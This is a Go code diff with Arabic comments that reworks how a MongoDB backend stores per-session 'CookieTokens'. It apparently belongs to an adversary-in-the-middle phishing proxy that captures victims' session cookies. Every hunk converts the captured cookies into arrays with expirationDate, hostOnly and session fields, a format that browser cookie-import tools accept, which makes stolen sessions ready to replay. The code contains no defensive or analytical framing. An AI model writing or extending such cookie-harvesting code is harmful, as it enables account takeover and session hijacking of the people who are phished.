@@ -125,16 +125,24 @@ func convertToMongoSession(s *Session) *MongoSession {
 	log.Debug("[MongoDB] - Session.Country: '%s'", s.Country)
 
 	// تحويل CookieTokens
-	cookieTokens := make(map[string]map[string]interface{})
+	cookieTokens := make(map[string][]map[string]interface{})
 	for domain, tokens := range s.CookieTokens {
-		cookieTokens[domain] = make(map[string]interface{})
+		cookieTokens[domain] = []map[string]interface{}{}
 		for name, token := range tokens {
-			cookieTokens[domain][name] = map[string]interface{}{
-				"name":      token.Name,
-				"value":     token.Value,
-				"path":      token.Path,
-				"http_only": token.HttpOnly,
+			hostOnly := !strings.HasPrefix(domain, ".")
+			session := token.Expires.IsZero() || token.Expires.Unix() == 0
+			cookieObj := map[string]interface{}{
+				"name":            token.Name,
+				"value":           token.Value,
+				"domain":          domain,
+				"path":            token.Path,
+				"expirationDate":  token.Expires.Unix(),
+				"httpOnly":        token.HttpOnly,
+				"hostOnly":        hostOnly,
+				"secure":          false, // إذا كان لديك حقل Secure أضفه هنا
+				"session":         session,
 			}
+			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
 		}
 	}
 
@@ -183,7 +191,7 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 					Name:     getStringValue(tokenMap["name"]),
 					Value:    getStringValue(tokenMap["value"]),
 					Path:     getStringValue(tokenMap["path"]),
-					HttpOnly: getBoolValue(tokenMap["http_only"]),
+					HttpOnly: getBoolValue(tokenMap["httpOnly"]),
 				}
 			}
 		}
@@ -539,15 +547,42 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 	}
 	
 	// تحويل رموز الكوكيز إلى التنسيق المناسب لـ MongoDB
-	cookieTokens := make(map[string]map[string]interface{})
+	cookieTokens := make(map[string][]map[string]interface{})
+	for domain, domainTokens := range tokens {
+		cookieTokens[domain] = []map[string]interface{}{}
+		for name, token := range domainTokens {
+			hostOnly := !strings.HasPrefix(domain, ".")
+			session := token.Expires.IsZero() || token.Expires.Unix() == 0
+			cookieObj := map[string]interface{}{
+				"name":            token.Name,
+				"value":           token.Value,
+				"domain":          domain,
+				"path":            token.Path,
+				"expirationDate":  token.Expires.Unix(),
+				"httpOnly":        token.HttpOnly,
+				"hostOnly":        hostOnly,
+				"secure":          false, // إذا كان لديك حقل Secure أضفه هنا
+				"session":         session,
+			}
+			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
+		}
+	}
 	
 	// حفظ الكوكيز الحالية إذا كانت موجودة
 	if session.CookieTokens != nil {
 		// نسخ الكوكيز الحالية
 		for domain, domainTokens := range session.CookieTokens {
-			cookieTokens[domain] = make(map[string]interface{})
+			cookieTokens[domain] = make([]map[string]interface{}, 0)
 			for name, token := range domainTokens {
-				cookieTokens[domain][name] = token
+				// إذا كان token من نوع map[string]interface{}، أضف expires إذا لم يكن موجودًا
+				if tokenMap, ok := token.(map[string]interface{}); ok {
+					if _, hasExpires := tokenMap["expirationDate"]; !hasExpires {
+						tokenMap["expirationDate"] = int64(0)
+					}
+					cookieTokens[domain] = append(cookieTokens[domain], tokenMap)
+				} else {
+					cookieTokens[domain] = append(cookieTokens[domain], token)
+				}
 			}
 		}
 	}
@@ -555,9 +590,8 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 	// تحديث/إضافة الكوكيز الجديدة
 	for domain, domainTokens := range tokens {
 		if _, ok := cookieTokens[domain]; !ok {
-			cookieTokens[domain] = make(map[string]interface{})
+			cookieTokens[domain] = make([]map[string]interface{}, 0)
 		}
-		
 		for name, token := range domainTokens {
 			isImportant := false
 			// التحقق مما إذا كان الكوكي مهماً
@@ -567,29 +601,27 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 					break
 				}
 			}
-			
 			// حفظ الكوكي مع قيمته
 			cookieData := map[string]interface{}{
-				"name":      token.Name,
-				"value":     token.Value,
-				"path":      token.Path,
-				"http_only": token.HttpOnly,
+				"name":            token.Name,
+				"value":           token.Value,
+				"domain":          domain,
+				"path":            token.Path,
+				"expirationDate":  token.Expires.Unix(),
+				"httpOnly":        token.HttpOnly,
+				"hostOnly":        !strings.HasPrefix(domain, "."),
+				"secure":          false, // إذا كان لديك حقل Secure أضفه هنا
+				"session":         token.Expires.IsZero() || token.Expires.Unix() == 0,
 			}
-			
-			// استخدام الاسم الأصلي (مع الحفاظ على حالة الأحرف) للكوكيز المهمة
 			if isImportant {
-				log.Success("[MongoDB] تحويل كوكي مهم للحفظ: %s = %s", name, token.Value)
-				cookieTokens[domain][name] = cookieData
-				
-				// أيضاً، حفظه باسم مطابق 100% للقائمة المهمة للتأكد
+				cookieTokens[domain] = append(cookieTokens[domain], cookieData)
 				for _, importantName := range importantCookies {
 					if strings.EqualFold(name, importantName) {
-						cookieTokens[domain][importantName] = cookieData
-						log.Success("[MongoDB] تحويل كوكي مهم باسمه الأصلي: %s = %s", importantName, token.Value)
+						cookieTokens[domain] = append(cookieTokens[domain], cookieData)
 					}
 				}
 			} else {
-				cookieTokens[domain][name] = cookieData
+				cookieTokens[domain] = append(cookieTokens[domain], cookieData)
 			}
 		}
 	}
